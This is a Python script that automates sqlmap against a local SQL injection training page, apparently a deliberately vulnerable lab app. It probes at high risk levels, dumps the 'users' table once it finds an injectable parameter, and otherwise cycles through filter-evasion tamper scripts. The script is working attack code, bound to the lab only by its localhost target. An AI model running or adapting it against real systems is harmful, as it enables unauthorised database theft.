print('Ghost script started')
import time
import subprocess
import os

class SQLGhostTrainer:
    def __init__(self):
        self.log_file = "/home/arvind/jarvis/memory_logs/sql_ghost.log"
        self.target = "http://localhost/vulnerabilities/sqli/"
        self.cookies = "security=low; PHPSESSID=jarvis-trainer-session"
        self.tampers = ["space2comment", "between", "randomcase", "charencode", "equaltolike"]

    def log(self, message):
        with open(self.log_file, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {message}\n")

    def run_injection_probe(self, tamper=None):
        cmd = ["sqlmap", "-u", self.target, "--batch", "--level=3", "--risk=3", "--forms", f"--cookie={self.cookies}", "--disable-tui", "--no-cast"]
        if tamper:
            cmd.extend(["--tamper", tamper])
        
        self.log(f"Probing with tamper: {tamper if tamper else 'None'}")
        return subprocess.run(cmd, capture_output=True, text=True)

    def evolve(self):
        self.log("Initializing Ghost Protocol: SQLi Evolution")
        
        # Phase 1: Aggressive Detection
        result = self.run_injection_probe()
        if "parameter 'id' is vulnerable" in result.stdout:
            self.log("Injection point identified. Executing Ghost-Dump.")
            dump_cmd = ["sqlmap", "-u", self.target, "--batch", "--dump", "-T", "users", f"--cookie={self.cookies}", "--disable-tui", "--no-cast"]
            subprocess.run(dump_cmd)
        else:
            # Phase 2: Adaptive Tampering
            self.log("Baseline failed. Engaging Ghost Tamper Modules...")
            for tamper in self.tampers:
                self.log(f"Attempting vector: {tamper}")
                res = self.run_injection_probe(tamper=tamper)
                if "parameter 'id' is vulnerable" in res.stdout:
                    self.log(f"SUCCESS: {tamper} vector compromised target.")
                    break
        
        self.log("Ghost Protocol Cycle Complete.")

if __name__ == "__main__":
    trainer = SQLGhostTrainer()
    trainer.evolve()
